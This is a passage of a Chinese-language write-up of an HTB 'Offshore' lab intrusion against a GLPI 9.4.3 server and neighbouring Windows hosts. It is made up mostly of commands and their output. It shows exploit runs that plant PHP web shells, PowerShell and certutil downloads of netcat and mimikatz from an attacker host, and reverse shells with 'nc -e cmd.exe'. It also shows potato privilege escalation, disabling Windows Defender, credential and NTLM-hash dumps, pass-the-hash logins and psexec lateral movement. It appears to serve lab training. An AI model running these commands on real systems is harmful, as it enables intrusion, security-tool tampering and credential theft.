[+] Server Header : Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.5
[+] Version of GLPI : 9.4.3
        [+] Looking for [GLPI] exploits depending on version [9.4.3]

        [+] Vulnerable to: GZIP RCE
        [+] Reference: https://github.com/AlmondOffSec/PoCs/blob/master/glpi_rce_gzip/poc.txt
        [+] CVE: CVE-2020-11060

        [+] Vulnerable to: GLPI static encryption key
        [+] Reference: https://offsec.almond.consulting/multiple-vulnerabilities-in-glpi.html
        [+] CVE: CVE-2020-5248

        [+] Vulnerable to: Open Redirect
        [+] Reference: https://offsec.almond.consulting/multiple-vulnerabilities-in-glpi.html
        [+] CVE: CVE-2020-11034

        [+] Vulnerable to: Multiple XSS
        [+] Reference: https://offsec.almond.consulting/multiple-vulnerabilities-in-glpi.html
        [+] CVE: CVE-2020-11036

        [+] Vulnerable to: Weak CSRF tokens
        [+] Reference: https://offsec.almond.consulting/multiple-vulnerabilities-in-glpi.html
        [+] CVE: CVE-2020-11035

        [+] Vulnerable to: Reflected XSS in Dropdown endpoints                                          
        [+] Reference: https://offsec.almond.consulting/multiple-vulnerabilities-in-glpi.html
        [+] CVE: CVE-2020-11062

        [+] Vulnerable to: Able to read any token through API user endpoint                             
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-rf54-3r4w-4h55
        [+] CVE: CVE-2020-11033

        [+] Vulnerable to: Multiple SQL Injections Stemming From isNameQuoted()                         
        [+] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15176
        [+] CVE: CVE-2020-15176

        [+] Vulnerable to: Unauthenticated File Deletion                                                
        [+] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15175
        [+] CVE: CVE-2020-15175

        [+] Vulnerable to: Unauthenticated Cross Site Scripting (XSS) in install/install.php            
        [+] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15177
        [+] CVE: CVE-2020-15177

        [+] Vulnerable to: SQL Injection in the APIs search function                                    
        [+] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-15226
        [+] CVE: CVE-2020-15226

        [+] Vulnerable to: Authenticated insecure direct object reference on ajax/getDropdownValue.php  
        [+] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-27663
        [+] CVE: CVE-2020-27663

        [+] Vulnerable to: Authenticated insecure direct object reference on ajax/comments.php          
        [+] Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-27662
        [+] CVE: CVE-2020-27662

        [+] Vulnerable to: Unsafe Reflection in getItemForItemtype()                                    
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-qmw7-w2m4-rjwp
        [+] CVE: CVE-2021-21327

        [+] Vulnerable to: Horizontal Privilege Escalation                                              
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-vmj9-cg56-p7wh
        [+] CVE: CVE-2021-21326

        [+] Vulnerable to: Stored XSS in budget type                                                    
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-m574-f3jw-pwrf
        [+] CVE: CVE-2021-21325

        [+] Vulnerable to: Insecure Direct Object Reference                                             
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-jvwm-gq36-3v7v
        [+] CVE: CVE-2021-21324

        [+] Vulnerable to: XSS injection on ticket update                                               
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-2w7j-xgj7-3xgg
        [+] CVE: CVE-2021-21314

        [+] Vulnerable to: XSS on tabs                                                                  
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-h4hj-mrpg-xfgx
        [+] CVE: CVE-2021-21313

        [+] Vulnerable to: Stored XSS on documents                                                      
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-c7f6-3mr7-3rq2
        [+] CVE: CVE-2021-21312

        [+] Vulnerable to: Stored Cross-Site Scripting (XSS)                                            
        [+] Reference: https://n3k00n3.github.io/blog/09042021/glpi_xss.html
        [+] CVE: CVE-2021-3486

        [+] Vulnerable to: CSRF Bypass                                                                  
        [+] Reference: https://github.com/glpi-project/glpi/releases/tag/9.5.6
        [+] CVE: CVE-2021-39209

        [+] Vulnerable to: Autologin cookie accessible by scripts                                       
        [+] Reference: https://github.com/glpi-project/glpi/releases/tag/9.5.6
        [+] CVE: CVE-2021-39210

        [+] Vulnerable to: Disclosure of GLPI and server informations in telemetry endpoint             
        [+] Reference: https://github.com/glpi-project/glpi/releases/tag/9.5.6
        [+] CVE: CVE-2021-39211

        [+] Vulnerable to: Bypassable IP restriction on GLPI API using custom header injection          
        [+] Reference: https://github.com/glpi-project/glpi/releases/tag/9.5.6
        [+] CVE: CVE-2021-39213

        [+] Vulnerable to: SQL injection using custom CSS administration form                           
        [+] Reference: https://github.com/glpi-project/glpi/commit/5c3eee696b503fdf502f506b00d15cf5b324b326
        [+] CVE: CVE-2022-21720

        [+] Vulnerable to: Reflected XSS using reload button                                            
        [+] Reference: https://github.com/glpi-project/glpi/commit/e9b16bc8e9b61ebb2d35b96b9c71cd25c5af9e48
        [+] CVE: CVE-2022-21719

        [+] Vulnerable to: LDAP password exposed on source code                                         
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-4r49-52q9-5fgr
        [+] CVE: CVE-2022-24867

        [+] Vulnerable to: Cross Site CSS Injection                                                     
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-p94c-8qp5-gfpx
        [+] CVE: CVE-2022-24869

        [+] Vulnerable to: XSS / open redirect via SVG file upload                                      
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-9hg4-fpwv-gx78
        [+] CVE: CVE-2022-24868

        [+] Vulnerable to: SQL injection on login page                                                  
        [+] Reference: https://www.swascan.com/security-advisory-teclib-glpi/
        [+] CVE: CVE-2022-31061

        [+] Vulnerable to: Command injection using a third-party library script                         
        [+] Reference: https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
        [+] CVE: CVE-2022-35914

        [+] Vulnerable to: Command injection using a third-party library script                         
        [+] Reference: https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
        [+] CVE: CVE-2022-35914

        [+] Vulnerable to: SQL injection through plugin controller                                      
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-92q5-pfr8-r9r2
        [+] CVE: CVE-2022-35946

        [+] Vulnerable to: Authentication via SQL injection                                             
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-7p3q-cffg-c8xh
        [+] CVE: CVE-2022-35947

        [+] Vulnerable to: Improper access to debug panel                                               
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-6c2p-wgx9-vrjc
        [+] CVE: CVE-2022-39370

        [+] Vulnerable to: User's session persist after permanently deleting his account                
        [+] Reference: https://huntr.dev/bounties/62096b15-2b7b-4de3-96d1-32754c5f9d44/
        [+] CVE: CVE-2022-39234

        [+] Vulnerable to: Stored XSS on login page                                                     
        [+] Reference: https://huntr.dev/bounties/54fc907e-6983-4c24-b249-1440aac1643c/
        [+] CVE: CVE-2022-39262

        [+] Vulnerable to: SQL Injection on REST API                                                    
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-cp6q-9p4x-8hr9
        [+] CVE: CVE-2022-39323

        [+] Vulnerable to: Blind Server-Side Request Forgery (SSRF) in RSS feeds and planning           
        [+] Reference: https://huntr.dev/bounties/7a88f92b-1ee2-4ca8-9cf8-05fcf6cfe73f/
        [+] CVE: CVE-2022-39276

        [+] Vulnerable to: XSS in external links                                                        
        [+] Reference: https://huntr.dev/bounties/8e047ae1-7a7c-48e0-bee3-d1c36e52ff42/
        [+] CVE: CVE-2022-39277

        [+] Vulnerable to: Stored XSS in user information                                               
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-5rj7-95qc-89h2
        [+] CVE: CVE-2022-39372

        [+] Vulnerable to: Stored XSS in entity name                                                    
        [+] Reference: https://huntr.dev/bounties/d3c269fc-a865-425f-89e1-15fb32e85e96/
        [+] CVE: CVE-2022-39373

        [+] Vulnerable to: XSS through public RSS feed                                                  
        [+] Reference: https://huntr.dev/bounties/b45146ef-0f1a-4de9-90be-5c4d78b34fdf/
        [+] CVE: CVE-2022-39375

        [+] Vulnerable to: Improper input validation on emails links                                    
        [+] Reference: https://huntr.dev/bounties/3557ccc4-9325-41e8-ae01-18685adcd888/
        [+] CVE: CVE-2022-39376

        [+] Vulnerable to: XSS Stored inside Standard Interface Help Link href attribute                
        [+] Reference: https://huntr.dev/bounties/67f2f5da-5316-4bae-96b6-b0f0d719c4bf/
        [+] CVE: CVE-2022-41941

        [+] Vulnerable to: XSS on external links                                                        
        [+] Reference: https://huntr.dev/bounties/9976a2ed-b105-453c-8af8-2768eb1bbb87/
        [+] CVE: CVE-2023-22725

        [+] Vulnerable to: XSS on browse views                                                          
        [+] Reference: https://github.com/glpi-project/glpi/security/advisories/GHSA-352j-wr38-493c
        [+] CVE: CVE-2023-22722

[+] Performing CVE-2022-35914 check                                                                     
===================================
                                                                                                        

[+] Performing Credential check                                                                         
===============================
                                                                                                        
[+] Valid user account found : normal:normal

[+] Performing default files check                                                                      
==================================
                                                                                                        
[+] Interesting file found : http://172.16.2.12//ajax/telemetry.php
[+] Interesting file found : http://172.16.2.12//CHANGELOG.md
[+] Interesting file found : http://172.16.2.12//status.php

[+] Performing default folders check                                                                    
====================================

[+] Interesting folder found : http://172.16.2.12//plugins                                              
        [+] : http://172.16.2.12//plugins/remove.txt

[+] Performing default server check                                                                     
===================================
                                                                                                        

[+] Performing Plugins check                                                                            
============================
                                    
```

拿到凭据normal:normal

## 漏洞利用
[https://github.com/SamSepiolProxy/GLPI-9.4.3-Account-Takeover](https://github.com/SamSepiolProxy/GLPI-9.4.3-Account-Takeover)

```c
┌──(kali㉿kali)-[~/Desktop/tools/GLPI-9.4.3-Account-Takeover-main]
└─$ proxychains -q \
python reset.py \
--url http://172.16.2.12/ \
--user normal \
--password normal \
--email glpi_adm@offshore.com \
--newpass admin
[+] Password changed! ;
```

[https://www.exploit-db.com/exploits/51726](https://www.exploit-db.com/exploits/51726)

[https://github.com/0xdreadnaught/cve-2020-11060-poc](https://github.com/0xdreadnaught/cve-2020-11060-poc)

```c
┌──(kali㉿kali)-[~/Desktop/tools/CVE-2020-11060]
└─$ proxychains -q \
python CVE-2020-11060.py \
--url http://172.16.2.12/ \
--user glpi_adm \
--password admin \
--platform win
[+] GLPI Browser targeting 'http://172.16.2.12/' ('windows') with following credentials: 'glpi_adm':'admin'.
[+] Target is up and responding.
[+] User 'glpi_adm' is logged in.
------------------------- trial number 1 -------------------------
[*] Wiping networks...
[+] Network created
[+] Modifying network
        New ESSID: RCEe
[+] Current shellname: ZFNWgrzY.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\ZFNWgrzY.php
[+] File 'dumped', accessible at: http://172.16.2.12//sound/ZFNWgrzY.php
[+] Shell size: 14009
------------------------- trial number 2 -------------------------
[*] Wiping networks...
        Deleting network id: 1815
[+] Network created
[+] Modifying network
        New ESSID: RCEee
[+] Current shellname: cBTSVoYZ.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\cBTSVoYZ.php
[+] File 'dumped', accessible at: http://172.16.2.12//sound/cBTSVoYZ.php
[+] Shell size: 14010
------------------------- trial number 3 -------------------------
[*] Wiping networks...
        Deleting network id: 1816
[+] Network created
[+] Modifying network
        New ESSID: RCEeee
[+] Current shellname: iISMzLoC.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\iISMzLoC.php
[+] File 'dumped', accessible at: http://172.16.2.12//sound/iISMzLoC.php
[+] Shell size: 14009
------------------------- trial number 4 -------------------------
[*] Wiping networks...
        Deleting network id: 1817
[+] Network created
[+] Modifying network
        New ESSID: RCEeeee
[+] Current shellname: hwDdECVs.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\hwDdECVs.php
[+] File 'dumped', accessible at: http://172.16.2.12//sound/hwDdECVs.php
[+] Shell size: 14009
------------------------- trial number 5 -------------------------
[*] Wiping networks...
        Deleting network id: 1818
[+] Network created
[+] Modifying network
        New ESSID: RCEeeeee
[+] Current shellname: CNIeEUEm.php
[*] Dumping the database remotely at: C:\xampp\htdocs\sound\CNIeEUEm.php
[+] File 'dumped', accessible at: http://172.16.2.12//sound/CNIeEUEm.php
[+] Shell size: 8480
------------------------------------------------------------------
[+] RCE found after 5 trials!
[+] You can execute command remotely as: nt authority\network service@MGMT01
[+] Run this tool again with the desired command to inject:
        python3 CVE-2020-11060.py --url 'http://172.16.2.12//sound/CNIeEUEm.php' --command 'desired_command_here'
```

```c
proxychains -q \
python CVE-2020-11060.py \
--url http://172.16.2.12//sound/CNIeEUEm.php \
--command 'whoami'
```

## 反弹shell
```c
proxychains -q \
python CVE-2020-11060.py \
--url http://172.16.2.12//sound/CNIeEUEm.php \
--command 'powershell -c "(New-Object Net.WebClient).DownloadFile(\"http://10.10.16.2/nc64.exe\",\"C:\Users\Public\nc.exe\")"'
```

```c
proxychains -q \
python CVE-2020-11060.py \
--url http://172.16.2.12//sound/CNIeEUEm.php \
--command 'C:\Users\Public\nc.exe 10.10.16.2 4444 -e cmd.exe'
```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.110.3] 14901
Microsoft Windows [Version 10.0.17763.2803]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\sound>whoami
whoami
nt authority\network service
```

## Getflag
```c
C:\Users\Public>type flag.txt
type flag.txt
OFFSHORE{rc3_fun_w1th_gziP!}
```

## 提权
### 线索
```c
C:\xampp\htdocs\sound>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

发现：

```plain
SeImpersonatePrivilege  Enabled
```

这是 **土豆提权条件**

### SharpEfsPotato提权
```c
C:\xampp\htdocs\sound>certutil -urlcache -f http://10.10.16.2/SharpEfsPotato.exe C:\Users\Public\SharpEfsPotato.exe

certutil -urlcache -f http://10.10.16.2/SharpEfsPotato.exe C:\Users\Public\SharpEfsPotato.exe
Access is denied.

C:\xampp\htdocs\sound>powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.16.2/SharpEfsPotato.exe','C:\Users\Public\SharpEfsPotato.exe')"
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.16.2/SharpEfsPotato.exe','C:\Users\Public\SharpEfsPotato.exe')"
```

```c
C:\Users\Public>C:\Users\Public\SharpEfsPotato.exe -p cmd.exe -a "/c C:\Users\Public\nc.exe 10.10.16.2 9999 -e cmd.exe"
SharpEfsPotato by @bugch3ck
  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/9475dd20-c9c3-4207-b057-974c56cf1952/\9475dd20-c9c3-4207-b057-974c56cf1952\9475dd20-c9c3-4207-b057-974c56cf1952
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\Users\Public>

```

```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ nc -lvnp 9999              
listening on [any] 9999 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.110.3] 4564
Microsoft Windows [Version 10.0.17763.2803]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Getflag
```c
C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
OFFSHORE{l0ng_liv3_Th3_t@ter!}
```

## mimikataz
### download
```c
powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.16.2/mimikatz.exe','C:\Users\Public\mimikatz.exe')"
```

发现存在杀软

```c
PS C:\Users\Public> Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableRealtimeMonitoring $true
PS C:\Users\Public> sc stop WinDefend
sc stop WinDefend
PS C:\Users\Public> certutil -urlcache -f http://10.10.16.2/mimikatz.exe m.exe

certutil -urlcache -f http://10.10.16.2/mimikatz.exe m.exe
****  Online  ****
```

```c
PS C:\Users\Public> .\m.exe
.\m.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
```

### sekurlsa::logonpasswords
```c
PS C:\Users\Public> .\m.exe
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 82500 (00000000:00014244)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:05 AM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : MGMT01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MGMT01$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:05 AM
SID               : S-1-5-20
        msv :
        tspkg :
        wdigest :
         * Username : MGMT01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : mgmt01$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 51632 (00000000:0000c9b0)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:04 AM
SID               : S-1-5-96-0-0
        msv :
        tspkg :
        wdigest :
         * Username : MGMT01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:06 AM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 82471 (00000000:00014227)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:05 AM
SID               : S-1-5-90-0-1
        msv :
        tspkg :
        wdigest :
         * Username : MGMT01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 51663 (00000000:0000c9cf)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:04 AM
SID               : S-1-5-96-0-1
        msv :
        tspkg :
        wdigest :
         * Username : MGMT01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 50447 (00000000:0000c50f)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:04 AM
SID               : 
        msv :
        tspkg :
        wdigest :
        kerberos :
        ssp :
        credman :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MGMT01$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 3/10/2026 8:49:04 AM
SID               : S-1-5-18
        msv :
        tspkg :
        wdigest :
         * Username : MGMT01$
         * Domain   : WORKGROUP
         * Password : (null)
        kerberos :
         * Username : mgmt01$
         * Domain   : WORKGROUP
         * Password : (null)
        ssp :
        credman :
```

### lsadump::sam
```c
mimikatz # lsadump::sam
Domain : MGMT01
SysKey : 31899a247e1007a27d4a8a3e58797d91
Local SID : S-1-5-21-1154729660-2961137151-3216164857

SAMKey : 01ddca8aef166d32006026473325cea1

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 971bc1ac6d2344c4b42107976e0972dc
    lm  - 0: 7bf2268113ac2c7d413343cc7b097bba
    ntlm- 0: 971bc1ac6d2344c4b42107976e0972dc
    ntlm- 1: 44f077e27f6fef69e7bd834c7242b040

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 64cb28f3cb4e97b7dcae3dcd7131dcc3

* Primary:Kerberos-Newer-Keys *
    Default Salt : MGMT01.DEV.ADMIN.OFFSHORE.COMAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 597c3a6c66d372b15eaab567c1c732af04dfe9964984eb56be4de836ec725291
      aes128_hmac       (4096) : 1fa45e94015885c42e8bfce6ea320069
      des_cbc_md5       (4096) : dafde052e99e0e15
    OldCredentials
      aes256_hmac       (4096) : 4576214c9bcf89d6bb7d8e787ced60e9c9a1ce2ef37c3b1037182d8b8bb85042
      aes128_hmac       (4096) : ddbc9876ebf44420295e9611e1cd66d3
      des_cbc_md5       (4096) : 736179d50e8cdc02

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : MGMT01.DEV.ADMIN.OFFSHORE.COMAdministrator
    Credentials
      des_cbc_md5       : dafde052e99e0e15
    OldCredentials
      des_cbc_md5       : 736179d50e8cdc02


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: f134707b7798ad1bbf37f49a6a422a38

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f8de682b2fd3d4ecc0d1ebe86b2cbe50

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a94f7a116fb8e6999806d1091b95ff19c70c26ce8c33151c0ba27f1808326c58
      aes128_hmac       (4096) : d9159a6afa76137662bafc849d2a9002
      des_cbc_md5       (4096) : e02f013e8f4f8cf4

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : e02f013e8f4f8cf4
```

得到凭据 User : Administrator  Hash NTLM: 971bc1ac6d2344c4b42107976e0972dc

## Administrator登录
```c
┌──(kali㉿kali)-[~/Desktop/htb/offshore]
└─$ proxychains -q evil-winrm -i 172.16.2.12 -u Administrator -H 971bc1ac6d2344c4b42107976e0972dc
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
mgmt01\administrator
```

## Getflag


# 172.16.2.102(Windows)（Setp:9）
## 端口扫描
```c
*Evil-WinRM* PS C:\Users\Administrator\Documents>
$ip = "172.16.2.102"
1..65535 | ForEach-Object {
    $port = $_
    $client = New-Object System.Net.Sockets.TcpClient
    $iar = $client.BeginConnect($ip, $port, $null, $null)

    if ($iar.AsyncWaitHandle.WaitOne(10, $false)) {
        try {
            $client.EndConnect($iar)
            Write-Output "Port open $port"
        } catch {}
    }

    $client.Close()
}
Port open 135
Port open 139
Port open 445
Port open 3389                                                             
Port open 5357
Port open 49152
Port open 49153
Port open 49154
Port open 49155
Port open 49156
Port open 49157
```

## Joe登录
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec DEV.ADMIN.OFFSHORE.COM/joe@172.16.2.6
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 172.16.2.6.....
[-] share 'ADMIN$' is not writable.
[-] share 'C$' is not writable.
[-] share 'NETLOGON' is not writable.
[-] share 'SYSVOL' is not writable.
```

在DC02上没办法登录，尝试枚举

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q crackmapexec smb 172.16.2.0/24 -u joe -p ''
SMB         172.16.2.6      445    DC02             [*] Windows Server 2016 Standard 14393 x64 (name:DC02) (domain:dev.ADMIN.OFFSHORE.COM) (signing:True) (SMBv1:True)
SMB         172.16.2.6      445    DC02             [+] dev.ADMIN.OFFSHORE.COM\joe: 
SMB         172.16.2.102    445    WS03             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS03) (domain:dev.ADMIN.OFFSHORE.COM) (signing:False) (SMBv1:True)
SMB         172.16.2.102    445    WS03             [+] dev.ADMIN.OFFSHORE.COM\joe: (Pwn3d!)
```

发现WS03被joe Pwn3d!

```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/offshore]
└─# proxychains -q impacket-psexec DEV.ADMIN.OFFSHORE.COM/joe:''@172.16.2.102
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Requesting shares on 172.16.2.102.....
[*] Found writable share ADMIN$
[*] Uploading file GaPEunHN.exe
[*] Opening SVCManager on 172.16.2.102.....
[*] Creating service ZQPP on 172.16.2.102.....
[*] Starting service ZQPP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>
```

## Getflag
```plain
C:\Users\administrator\Desktop> type flag.txt
OFFSHORE{ACL_@bus3_0ft3n_ov3rl00k3d}
```

## Mimikatz
### 下载
```plain
 C:\Users\administrator\Desktop> certutil -urlcache -f http://10.10.16.2/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

### sekurlsa::logonpasswords
```c
 C:\Users\administrator\Desktop> mimikatz.exe
privilege::debug
mimikatz # Privilege '20' OK

sekurlsa::logonpasswords
mimikatz # 
Authentication Id : 0 ; 7414226 (00000000:007121d2)
Session           : Batch from 0
User Name         : Administrator
Domain            : DEV
Logon Server      : DC02
Logon Time        : 3/8/2026 12:08:33 PM
SID               : S-1-5-21-1416445593-394318334-2645530166-500
        msv :
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : DEV
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : DEV
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1627523 (00000000:0018d583)
Session           : RemoteInteractive from 2
User Name         : joe
Domain            : DEV
Logon Server      : DC02
Logon Time        : 3/8/2026 1:46:14 AM
SID               : S-1-5-21-1416445593-394318334-2645530166-1604
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : DEV
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
         [00010000] CredentialKeys
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : DEV
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : DEV.ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 1627483 (00000000:0018d55b)
Session           : RemoteInteractive from 2
User Name         : joe
Domain            : DEV
Logon Server      : DC02
Logon Time        : 3/8/2026 1:46:14 AM
SID               : S-1-5-21-1416445593-394318334-2645530166-1604
        msv :
         [00000003] Primary
         * Username : joe
         * Domain   : DEV
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
         [00010000] CredentialKeys
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
        tspkg :
        wdigest :
         * Username : joe
         * Domain   : DEV
         * Password : (null)
        kerberos :
         * Username : joe
         * Domain   : DEV.ADMIN.OFFSHORE.COM
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:04 PM
SID               : S-1-5-19
        msv :
        tspkg :
        wdigest :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        kerberos :
         * Username : (null)
         * Domain   : (null)
         * Password : (null)
        ssp :
        credman :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : WS03$
Domain            : DEV
Logon Server      : (null)
Logon Time        : 3/7/2026 11:42:03 PM
